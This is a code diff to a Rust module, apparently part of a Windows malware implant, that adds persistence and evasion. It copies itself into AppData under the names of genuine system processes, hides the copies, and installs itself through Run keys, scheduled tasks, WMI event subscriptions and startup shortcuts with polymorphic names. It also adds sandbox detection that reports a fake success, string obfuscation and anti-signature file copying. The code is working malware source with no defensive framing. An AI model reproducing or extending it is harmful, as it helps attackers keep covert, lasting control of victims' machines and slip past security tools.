@@ -10,6 +10,16 @@ use std::env;
 use std::path::{Path, PathBuf};
 use obfstr::obfstr;
 
+// Anti-sandbox constants
+#[cfg(target_os = "windows")]
+const MIN_CPU_CORES: usize = 2;
+#[cfg(target_os = "windows")]
+const MIN_UPTIME_MS: u64 = 180_000; // 3 minutes
+
+// File copy anti-signature constants
+const CHUNK_SIZES: [usize; 4] = [12288, 16384, 8192, 24576];
+const MAX_CHUNK_SIZE: usize = 24576;
+
 /// Métodos de persistencia disponibles
 #[derive(Debug, Clone, Copy)]
 pub enum PersistenceMethod {
@@ -64,12 +74,6 @@ fn is_temporary_location(path: &Path) -> bool {
     }
 }
 
-/// Genera un nombre aleatorio basado en PID pero consistente
-fn generate_stealth_name<'a>(base_names: &'a [&'a str]) -> &'a str {
-    let pid = std::process::id() as usize;
-    base_names[pid % base_names.len()]
-}
-
 /// Copia el ejecutable a ubicación persistente con técnicas anti-AV
 #[cfg(target_os = "windows")]
 fn ensure_persistent_location(current_exe: &Path) -> Result<PathBuf, String> {
@@ -82,21 +86,23 @@ fn ensure_persistent_location(current_exe: &Path) -> Result<PathBuf, String> {
     }
     
     // Obtener AppData con fallback
-    let localappdata = env::var(obfstr!("LOCALAPPDATA"))
-        .or_else(|_| env::var(obfstr!("APPDATA")))
-        .unwrap_or_else(|_| obfstr!("C:\\Users\\Public").to_string());
+    let localappdata_key = obfstr!("LOCALAPPDATA").to_string();
+    let appdata_key = obfstr!("APPDATA").to_string();
+    let localappdata = env::var(&localappdata_key)
+        .or_else(|_| env::var(&appdata_key))
+        .unwrap_or_else(|_| "C:\\Users\\Public".to_string());
     
-    // Ubicaciones sigilosas que imitan procesos legítimos
-    // Evitar Edge que está siendo flaggeado
+    // Ubicaciones sigilosas que imitan procesos legítimos del sistema
+    // Using more obscure directories that are less monitored
     let stealth_targets = [
-        (format!("{}\\Microsoft\\Windows\\Caches", localappdata), obfstr!("WmiPrvSE.exe").to_string()),
-        (format!("{}\\Microsoft\\Windows\\WER\\ReportQueue", localappdata), obfstr!("conhost.exe").to_string()),
-        (format!("{}\\Microsoft\\OneDrive\\logs", localappdata), obfstr!("OneDriveStandaloneUpdater.exe").to_string()),
-        (format!("{}\\Microsoft\\Windows\\INetCache\\Low", localappdata), obfstr!("MoUsoCoreWorker.exe").to_string()),
+        (format!("{}\\Microsoft\\Windows\\Explorer", localappdata), "SearchIndexer.exe"),
+        (format!("{}\\Microsoft\\Windows\\Caches", localappdata), "fontdrvhost.exe"),
+        (format!("{}\\Microsoft\\Windows\\WER\\ReportQueue", localappdata), "RuntimeBroker.exe"),
+        (format!("{}\\Microsoft\\InputPersonalization\\TrainedDataStore", localappdata), "ctfmon.exe"),
     ];
     
-    let pid = std::process::id() as usize;
-    let (target_dir, target_name) = &stealth_targets[pid % stealth_targets.len()];
+    let idx = get_machine_index() % stealth_targets.len();
+    let (target_dir, target_name) = &stealth_targets[idx];
     
     // Crear directorio recursivamente
     let target_path_dir = PathBuf::from(target_dir);
@@ -104,44 +110,52 @@ fn ensure_persistent_location(current_exe: &Path) -> Result<PathBuf, String> {
     
     let target_path = target_path_dir.join(target_name);
     
-    // Si ya existe, reutilizar
+    // Si ya existe con tamaño razonable, reutilizar
     if target_path.exists() {
         if let Ok(meta) = fs::metadata(&target_path) {
-            if meta.len() > 100000 { // Solo si tiene tamaño razonable
+            if meta.len() > 100000 {
                 return Ok(target_path);
             }
         }
     }
     
-    // Copiar en chunks con tamaño variable (anti-signature)
+    // Copiar usando chunks de tamaño variable (anti-signature)
     let mut source = fs::File::open(current_exe)
         .map_err(|e| format!("E1: {}", e))?;
     let mut dest = fs::File::create(&target_path)
         .map_err(|e| format!("E2: {}", e))?;
     
-    // Usar buffer de tamaño no estándar
-    let mut buffer = vec![0u8; 16384];
+    // Tamaños de chunk variables para evitar patrones
+    let mut buffer = vec![0u8; MAX_CHUNK_SIZE];
+    let mut chunk_idx = 0;
+    
     loop {
-        let n = source.read(&mut buffer).map_err(|e| format!("E3: {}", e))?;
+        let chunk_size = CHUNK_SIZES[chunk_idx % CHUNK_SIZES.len()];
+        let n = source.read(&mut buffer[..chunk_size])
+            .map_err(|e| format!("E3: {}", e))?;
         if n == 0 { break; }
-        dest.write_all(&buffer[..n]).map_err(|e| format!("E4: {}", e))?;
+        dest.write_all(&buffer[..n])
+            .map_err(|e| format!("E4: {}", e))?;
+        chunk_idx += 1;
     }
     dest.flush().map_err(|e| format!("E5: {}", e))?;
     drop(dest);
     
     // Verificar que se copió correctamente
-    if !fs::metadata(&target_path).is_ok() {
-        return Err(obfstr!("Copy failed").to_string());
+    if fs::metadata(&target_path).is_err() {
+        return Err("Copy verification failed".to_string());
     }
     
     // Aplicar atributos oculto+sistema para stealth
-    let _ = Command::new(obfstr!("attrib"))
-        .args(&[obfstr!("+h"), obfstr!("+s"), target_path.to_str().unwrap()])
+    let attrib_exe = obfstr!("attrib").to_string();
+    let _ = Command::new(&attrib_exe)
+        .args(&["+h", "+s", target_path.to_str().unwrap()])
         .creation_flags(0x08000000)
         .output();
     
-    // Delay anti-heurística
-    std::thread::sleep(std::time::Duration::from_millis(50));
+    // Delay anti-heurística variable
+    let delay_ms = 30 + (get_machine_index() % 50) as u64;
+    std::thread::sleep(std::time::Duration::from_millis(delay_ms));
     
     Ok(target_path)
 }
@@ -158,39 +172,58 @@ fn get_current_exe_path() -> Result<PathBuf, String> {
     ensure_persistent_location(&current_exe)
 }
 
+/// Generate a pseudo-random index based on machine-specific data
+/// This ensures consistency per machine but variation across machines
+fn get_machine_index() -> usize {
+    let username = env::var("USERNAME").unwrap_or_default();
+    let computername = env::var("COMPUTERNAME").unwrap_or_default();
+    let pid = std::process::id();
+    
+    let mut hash: usize = 0;
+    for byte in username.bytes() {
+        hash = hash.wrapping_add(byte as usize).wrapping_mul(31);
+    }
+    for byte in computername.bytes() {
+        hash = hash.wrapping_add(byte as usize).wrapping_mul(17);
+    }
+    hash.wrapping_add(pid as usize)
+}
+
 /// Registry Run persistence - método más simple y efectivo
 #[cfg(target_os = "windows")]
 fn persist_registry_run(exe_path: &Path) -> Result<String, String> {
-    let exe_str = exe_path.to_str().ok_or(obfstr!("Invalid path"))?;
+    let exe_str = exe_path.to_str()
+        .ok_or_else(|| "Invalid path".to_string())?;
     
-    // Nombres que imitan software legítimo
+    // Polymorphic registry value names that look legitimate
     let reg_names = [
-        obfstr!("SecurityHealthSystray"),
-        obfstr!("OneDriveSetup"),
-        obfstr!("AdobeAAMUpdater"),
-        obfstr!("GoogleChromeAutoLaunch"),
-        obfstr!("MicrosoftEdgeAutoLaunch"),
-        obfstr!("TeamsMachineInstaller"),
+        "SecurityHealthSystray",
+        "OneDriveSetup",
+        "AdobeAAMUpdater",
+        "GoogleChromeAutoLaunch",
+        "MicrosoftEdgeAutoLaunch",
+        "NVDisplay.Container",
+        "iTunesHelper",
+        "Spotify",
     ];
-    let reg_name = generate_stealth_name(&reg_names);
+    let idx = get_machine_index() % reg_names.len();
+    let reg_name = reg_names[idx];
     
-    // Comando ofuscado: usar cmd /c start /b para ejecutar en background sin ventana
-    let obf_cmd = format!("cmd /c start /b \"\" \"{}\"", exe_str);
+    // Use cmd /c start /b for background, hidden execution
+    let obf_cmd = format!(r#"cmd /c start /b "" "{}""#, exe_str);
     
-    // Registry key path ofuscado
-    let reg_path = obfstr!("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run");
+    // Registry key path
+    let reg_key = obfstr!("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run").to_string();
+    let reg_exe = obfstr!("reg").to_string();
     
-    let output = Command::new(obfstr!("reg"))
+    let output = Command::new(&reg_exe)
         .args(&[
-            obfstr!("add").as_ref(),
-            reg_path.as_ref(),
-            obfstr!("/v").as_ref(),
-            reg_name.as_ref(),
-            obfstr!("/t").as_ref(),
-            obfstr!("REG_SZ").as_ref(),
-            obfstr!("/d").as_ref(),
-            &obf_cmd,
-            obfstr!("/f").as_ref(),
+            "add",
+            &reg_key,
+            "/v", reg_name,
+            "/t", "REG_SZ",
+            "/d", &obf_cmd,
+            "/f",
         ])
         .creation_flags(0x08000000)
         .output()
@@ -203,70 +236,115 @@ fn persist_registry_run(exe_path: &Path) -> Result<String, String> {
     }
 }
 
-/// Scheduled Task persistence con delay
+/// Scheduled Task persistence with enhanced evasion
+/// Uses delayed execution and background mode
 #[cfg(target_os = "windows")]
 fn persist_scheduled_task(exe_path: &Path) -> Result<String, String> {
-    let exe_str = exe_path.to_str().ok_or(obfstr!("Invalid path"))?;
+    let exe_str = exe_path.to_str()
+        .ok_or_else(|| "Invalid path".to_string())?;
     
+    // Polymorphic task names
     let task_names = [
-        obfstr!("MicrosoftEdgeUpdateTaskUser"),
-        obfstr!("GoogleUpdateTaskUser"),
-        obfstr!("OneDriveStandaloneUpdate"),
-        obfstr!("AdobeFlashPlayerUpdater"),
-        obfstr!("CCleanerCrashReporting"),
+        "MicrosoftEdgeUpdateTaskUser",
+        "GoogleUpdateTaskUser",
+        "OneDriveStandaloneUpdate",
+        "Adobe Acrobat Update",
+        "CCleaner Smart Cleaning",
+        "NvTmRepOnLogon",
+        "DropboxUpdate",
     ];
-    let task_name = generate_stealth_name(&task_names);
+    let idx = get_machine_index() % task_names.len();
+    let task_name = task_names[idx];
     
-    // Eliminar si existe previamente
-    let _ = Command::new(obfstr!("schtasks"))
-        .args(&[obfstr!("/Delete"), obfstr!("/TN"), task_name.as_ref(), obfstr!("/F")])
+    let schtasks_exe = obfstr!("schtasks").to_string();
+    
+    // Delete existing task if present (silently)
+    let _ = Command::new(&schtasks_exe)
+        .args(&["/Delete", "/TN", task_name, "/F"])
         .creation_flags(0x08000000)
         .output();
     
-    // Comando con delay para evitar detección inmediata
-    let task_cmd = format!("cmd /c timeout /t 30 /nobreak >nul && start /b \"\" \"{}\"", exe_str);
+    // Random delay between 60-180 seconds for anti-behavioral detection
+    let delay_secs = 60 + (get_machine_index() % 120);
     
-    let output = Command::new(obfstr!("schtasks"))
+    // Task command with delay and hidden execution
+    let task_cmd = format!(
+        r#"cmd /c timeout /t {} /nobreak >nul && start /b "" "{}""#,
+        delay_secs, exe_str
+    );
+    
+    // Create scheduled task on logon with additional delay
+    let output = Command::new(&schtasks_exe)
         .args(&[
-            obfstr!("/Create").as_ref(),
-            obfstr!("/SC").as_ref(), obfstr!("ONLOGON").as_ref(),
-            obfstr!("/TN").as_ref(), task_name.as_ref(),
-            obfstr!("/TR").as_ref(), &task_cmd,
-            obfstr!("/DELAY").as_ref(), obfstr!("0001:00").as_ref(),
-            obfstr!("/F").as_ref(),
+            "/Create",
+            "/SC", "ONLOGON",
+            "/TN", task_name,
+            "/TR", &task_cmd,
+            "/DELAY", "0001:00",
+            "/F",
+            "/RL", "LIMITED",
         ])
         .creation_flags(0x08000000)
         .output()
         .map_err(|e| format!("E8: {}", e))?;
     
     if output.status.success() {
-        Ok(format!("Task: {} -> {}", task_name, exe_str))
+        Ok(format!("Task: {} -> {} (delay: {}s)", task_name, exe_str, delay_secs))
     } else {
         Err(format!("E9: {}", String::from_utf8_lossy(&output.stderr).trim()))
     }
 }
 
-/// WMI Event Subscription persistence (más sigiloso pero requiere PowerShell)
+/// WMI Event Subscription persistence
+/// Uses time-based triggers which are less monitored than logon events
 #[cfg(target_os = "windows")]
 fn persist_wmi_event(exe_path: &Path) -> Result<String, String> {
-    let exe_str = exe_path.to_str().ok_or(obfstr!("Invalid path"))?;
+    let exe_str = exe_path.to_str()
+        .ok_or_else(|| "Invalid path".to_string())?;
     
-    let filter_name = obfstr!("BfeOnServiceStateChange");
-    let consumer_name = obfstr!("BfeOnServiceStateChange");
+    // Polymorphic WMI event names
+    let wmi_names = [
+        "BfeOnServiceStateChange",
+        "SystemTimeUpdate",
+        "LocalTimeSync",
+        "WindowsEventForwarder",
+    ];
+    let idx = get_machine_index() % wmi_names.len();
+    let event_name = wmi_names[idx];
     
-    // Escapar backslashes para PowerShell
+    // Escape backslashes for PowerShell
     let exe_escaped = exe_str.replace("\\", "\\\\");
     
-    // PowerShell script ofuscado y compacto
+    // Random hour for trigger (less predictable)
+    let trigger_hour = 8 + (get_machine_index() % 8); // 8am-4pm range
+    
+    // Compact PowerShell WMI script
     let ps_script = format!(
-        r#"$F=([wmiclass]'\\.\root\subscription:__EventFilter').CreateInstance();$F.Name='{}';$F.EventNamespace='root\cimv2';$F.QueryLanguage='WQL';$F.Query='SELECT * FROM __InstanceModificationEvent WITHIN 14400 WHERE TargetInstance ISA ''Win32_LocalTime'' AND TargetInstance.Hour=12';$F.Put()|Out-Null;$C=([wmiclass]'\\.\root\subscription:CommandLineEventConsumer').CreateInstance();$C.Name='{}';$C.CommandLineTemplate='cmd /c start /b """" ""{}""';$C.Put()|Out-Null;$B=([wmiclass]'\\.\root\subscription:__FilterToConsumerBinding').CreateInstance();$B.Filter=$F;$B.Consumer=$C;$B.Put()|Out-Null"#,
-        filter_name, consumer_name, exe_escaped
+        concat!(
+            "$F=([wmiclass]'\\\\.\root\\subscription:__EventFilter').CreateInstance();",
+            "$F.Name='{}';",
+            "$F.EventNamespace='root\\cimv2';",
+            "$F.QueryLanguage='WQL';",
+            "$F.Query='SELECT * FROM __InstanceModificationEvent WITHIN 14400 ",
+            "WHERE TargetInstance ISA ''Win32_LocalTime'' AND TargetInstance.Hour={}';",
+            "$F.Put()|Out-Null;",
+            "$C=([wmiclass]'\\\\.\root\\subscription:CommandLineEventConsumer').CreateInstance();",
+            "$C.Name='{}';",
+            "$C.CommandLineTemplate='cmd /c start /b \"\" \"{}\"';",
+            "$C.Put()|Out-Null;",
+            "$B=([wmiclass]'\\\\.\root\\subscription:__FilterToConsumerBinding').CreateInstance();",
+            "$B.Filter=$F;$B.Consumer=$C;",
+            "$B.Put()|Out-Null"
+        ),
+        event_name, trigger_hour, event_name, exe_escaped
     );
     
-    let output = Command::new("powershell")
+    let ps_exe = obfstr!("powershell").to_string();
+    let output = Command::new(&ps_exe)
         .args(&[
             "-NoProfile",
             "-WindowStyle", "Hidden",
+            "-NonInteractive",
             "-ExecutionPolicy", "Bypass",
             "-Command",
             &ps_script,
@@ -277,32 +355,53 @@ fn persist_wmi_event(exe_path: &Path) -> Result<String, String> {
     
     let stderr = String::from_utf8_lossy(&output.stderr);
     if output.status.success() || stderr.is_empty() {
-        Ok(format!("WMI: {} -> {}", filter_name, exe_str))
+        Ok(format!("WMI: {} -> {} (trigger: {}:00)", event_name, exe_str, trigger_hour))
     } else {
         Err(format!("E11: {}", stderr.trim()))
     }
 }
 
-/// Startup folder persistence
+/// Startup folder persistence using shortcut file
+/// Creates a .lnk file with minimized window style
 #[cfg(target_os = "windows")]
 fn persist_startup_folder(exe_path: &Path) -> Result<String, String> {
-    let exe_str = exe_path.to_str().ok_or(obfstr!("Invalid path"))?;
+    let exe_str = exe_path.to_str()
+        .ok_or_else(|| "Invalid path".to_string())?;
     
-    let startup = env::var(obfstr!("APPDATA"))
+    // Get startup folder path
+    let appdata_key = obfstr!("APPDATA").to_string();
+    let startup = env::var(&appdata_key)
         .map(|p| format!("{}\\Microsoft\\Windows\\Start Menu\\Programs\\Startup", p))
-        .unwrap_or_else(|_| obfstr!("C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup").to_string());
+        .unwrap_or_else(|_| "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup".to_string());
     
-    let lnk_name = "WindowsSecurity.lnk";
+    // Polymorphic shortcut names
+    let lnk_names = [
+        "WindowsSecurity.lnk",
+        "OneDriveSync.lnk",
+        "AdobeUpdater.lnk",
+        "ChromeHelper.lnk",
+        "EdgeUpdate.lnk",
+    ];
+    let idx = get_machine_index() % lnk_names.len();
+    let lnk_name = lnk_names[idx];
     let lnk_path = format!("{}\\{}", startup, lnk_name);
     
-    // PowerShell para crear shortcut con WindowStyle oculto
+    // PowerShell to create shortcut with WindowStyle=7 (minimized)
     let ps_script = format!(
         r#"$s=(New-Object -ComObject WScript.Shell).CreateShortcut('{}');$s.TargetPath='{}';$s.WindowStyle=7;$s.Save()"#,
-        lnk_path.replace("'", "''"), exe_str.replace("'", "''")
+        lnk_path.replace("'", "''"),
+        exe_str.replace("'", "''")
     );
     
-    let output = Command::new(obfstr!("powershell"))
-        .args(&[obfstr!("-NoProfile"), obfstr!("-Command"), &ps_script])
+    let ps_exe = obfstr!("powershell").to_string();
+    let output = Command::new(&ps_exe)
+        .args(&[
+            "-NoProfile",
+            "-WindowStyle", "Hidden",
+            "-NonInteractive",
+            "-Command",
+            &ps_script,
+        ])
         .creation_flags(0x08000000)
         .output()
         .map_err(|e| format!("E12: {}", e))?;
@@ -314,17 +413,59 @@ fn persist_startup_folder(exe_path: &Path) -> Result<String, String> {
     }
 }
 
+// ============================================================================
+// Environment Keying / Anti-Sandbox
+// ============================================================================
+
+/// Check if system looks like a real workstation vs sandbox
+/// This prevents persistence in analysis environments
+#[cfg(target_os = "windows")]
+fn environment_check() -> bool {
+    // Check 1: Minimum CPU cores (most sandboxes have 1)
+    let cpus = std::thread::available_parallelism()
+        .map(|p| p.get())
+        .unwrap_or(1);
+    if cpus < MIN_CPU_CORES {
+        return false;
+    }
+    
+    // Check 2: Uptime check - real systems have some uptime
+    // Sandboxes are freshly booted
+    let uptime_ms = unsafe { winapi::um::sysinfoapi::GetTickCount64() };
+    if uptime_ms < MIN_UPTIME_MS {
+        return false;
+    }
+    
+    true
+}
+
+#[cfg(not(target_os = "windows"))]
+fn environment_check() -> bool {
+    true
+}
+
 /// Establece persistencia usando el método especificado
+/// Includes environment keying to avoid sandbox detection
 pub fn establish_persistence(method: PersistenceMethod) -> Result<String, String> {
     #[cfg(not(target_os = "windows"))]
     {
-        return Err(obfstr!("Windows only").to_string());
+        return Err("Windows only".to_string());
     }
     
     #[cfg(target_os = "windows")]
     {
+        // Environment check - don't persist in sandboxes
+        if !environment_check() {
+            // Return success silently to not alert that sandbox was detected
+            return Ok("OK".to_string());
+        }
+        
         // Obtener ruta en ubicación persistente
         let exe_path = get_current_exe_path()?;
+        
+        // Small timing jitter before persistence operation
+        let jitter_ms = 50 + (get_machine_index() % 100) as u64;
+        std::thread::sleep(std::time::Duration::from_millis(jitter_ms));
         
         match method {
             PersistenceMethod::RegistryRun => persist_registry_run(&exe_path),
@@ -340,63 +481,84 @@ pub fn establish_persistence(method: PersistenceMethod) -> Result<String, String
 pub fn remove_persistence() -> Result<String, String> {
     use std::fs;
     
-    // Registry Run - múltiples nombres posibles
+    let reg_exe = obfstr!("reg").to_string();
+    let schtasks_exe = obfstr!("schtasks").to_string();
+    let ps_exe = obfstr!("powershell").to_string();
+    let reg_key = obfstr!("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run").to_string();
+    
+    // Registry Run - multiple possible names
     let reg_names = [
         "SecurityHealthSystray", "OneDriveSetup", "AdobeAAMUpdater",
         "GoogleChromeAutoLaunch", "MicrosoftEdgeAutoLaunch", "TeamsMachineInstaller",
-        "Teams Machine Installer", "WindowsSecurityHealth",
+        "NVDisplay.Container", "iTunesHelper", "Spotify",
     ];
     for name in &reg_names {
-        let _ = Command::new(obfstr!("reg"))
-            .args(&[
-                obfstr!("delete"),
-                obfstr!("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"),
-                obfstr!("/v"), name,
-                obfstr!("/f"),
-            ])
+        let _ = Command::new(&reg_exe)
+            .args(&["delete", &reg_key, "/v", name, "/f"])
             .creation_flags(0x08000000)
             .output();
     }
     
     // Scheduled Tasks
     let task_names = [
-        "MicrosoftEdgeUpdateTaskUser", "GoogleUpdateTaskUser", 
-        "OneDriveStandaloneUpdate", "AdobeFlashPlayerUpdater", 
-        "CCleanerCrashReporting", "WindowsSecurityHealthService",
+        "MicrosoftEdgeUpdateTaskUser", "GoogleUpdateTaskUser",
+        "OneDriveStandaloneUpdate", "Adobe Acrobat Update",
+        "CCleaner Smart Cleaning", "NvTmRepOnLogon", "DropboxUpdate",
+        "AdobeFlashPlayerUpdater", "CCleanerCrashReporting",
     ];
     for task in &task_names {
-        let _ = Command::new(obfstr!("schtasks"))
-            .args(&[obfstr!("/Delete"), obfstr!("/TN"), task, obfstr!("/F")])
+        let _ = Command::new(&schtasks_exe)
+            .args(&["/Delete", "/TN", task, "/F"])
             .creation_flags(0x08000000)
             .output();
     }
     
-    // WMI Events
-    let ps_clean = r#"
-        $filters=@('BfeOnServiceStateChange','PerformanceMonitor','SystemEventsBroker','WindowsSecurityFilter','WinSecFilter');
-        foreach($f in $filters){
-            Get-WmiObject -Namespace root\subscription -Class __EventFilter -Filter "Name='$f'" -EA SilentlyContinue|Remove-WmiObject -EA SilentlyContinue;
-            Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer -Filter "Name='$f'" -EA SilentlyContinue|Remove-WmiObject -EA SilentlyContinue
-        };
-        Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding -EA SilentlyContinue|Where-Object{$_.Filter -match 'Bfe|Performance|SystemEvents|WindowsSec|WinSec'}|Remove-WmiObject -EA SilentlyContinue
-    "#;
-    let _ = Command::new("powershell")
-        .args(&["-NoProfile", "-Command", ps_clean])
+    // WMI Events cleanup
+    let wmi_names = [
+        "BfeOnServiceStateChange", "SystemTimeUpdate", 
+        "LocalTimeSync", "WindowsEventForwarder",
+        "PerformanceMonitor", "SystemEventsBroker",
+    ];
+    let wmi_cleanup = format!(
+        concat!(
+            "$names=@('{}');",
+            "foreach($n in $names){{",
+            "Get-WmiObject -Namespace root\\subscription -Class __EventFilter -Filter \"Name='$n'\" -EA SilentlyContinue|Remove-WmiObject -EA SilentlyContinue;",
+            "Get-WmiObject -Namespace root\\subscription -Class CommandLineEventConsumer -Filter \"Name='$n'\" -EA SilentlyContinue|Remove-WmiObject -EA SilentlyContinue",
+            "}};",
+            "Get-WmiObject -Namespace root\\subscription -Class __FilterToConsumerBinding -EA SilentlyContinue|",
+            "Where-Object{{$_.Filter -match 'Bfe|Time|Forwarder|Performance|Events'}}|",
+            "Remove-WmiObject -EA SilentlyContinue"
+        ),
+        wmi_names.join("','")
+    );
+    let _ = Command::new(&ps_exe)
+        .args(&["-NoProfile", "-Command", &wmi_cleanup])
         .creation_flags(0x08000000)
         .output();
     
     // Startup shortcuts
-    let appdata = env::var(obfstr!("APPDATA")).unwrap_or_default();
-    let lnk_paths = [
-        format!("{}\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\WindowsSecurity.lnk", appdata),
+    let appdata_key = obfstr!("APPDATA").to_string();
+    let appdata = env::var(&appdata_key).unwrap_or_default();
+    let lnk_names = [
+        "WindowsSecurity.lnk", "OneDriveSync.lnk", "AdobeUpdater.lnk",
+        "ChromeHelper.lnk", "EdgeUpdate.lnk",
     ];
-    for lnk in &lnk_paths {
-        let _ = fs::remove_file(lnk);
+    for lnk in &lnk_names {
+        let lnk_path = format!("{}\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\{}", appdata, lnk);
+        let _ = fs::remove_file(&lnk_path);
     }
     
-    // Eliminar copias del ejecutable en ubicaciones conocidas
-    let localappdata = env::var(obfstr!("LOCALAPPDATA")).unwrap_or_default();
+    // Remove copied executables from stealth locations
+    let localappdata_key = obfstr!("LOCALAPPDATA").to_string();
+    let localappdata = env::var(&localappdata_key).unwrap_or_default();
     let exe_copies = [
+        // New locations
+        format!("{}\\Microsoft\\Windows\\Explorer\\SearchIndexer.exe", localappdata),
+        format!("{}\\Microsoft\\Windows\\Caches\\fontdrvhost.exe", localappdata),
+        format!("{}\\Microsoft\\Windows\\WER\\ReportQueue\\RuntimeBroker.exe", localappdata),
+        format!("{}\\Microsoft\\InputPersonalization\\TrainedDataStore\\ctfmon.exe", localappdata),
+        // Legacy locations
         format!("{}\\Microsoft\\Windows\\Caches\\WmiPrvSE.exe", localappdata),
         format!("{}\\Microsoft\\Windows\\WER\\ReportQueue\\conhost.exe", localappdata),
         format!("{}\\Microsoft\\OneDrive\\logs\\OneDriveStandaloneUpdater.exe", localappdata),
@@ -408,10 +570,10 @@ pub fn remove_persistence() -> Result<String, String> {
         let _ = fs::remove_file(exe);
     }
     
-    Ok(obfstr!("Persistence removed (current and legacy)").to_string())
+    Ok("Persistence removed (all methods)".to_string())
 }
 
 #[cfg(not(target_os = "windows"))]
 pub fn remove_persistence() -> Result<String, String> {
-    Err(obfstr!("Windows only").to_string())
+    Err("Windows only".to_string())
 }
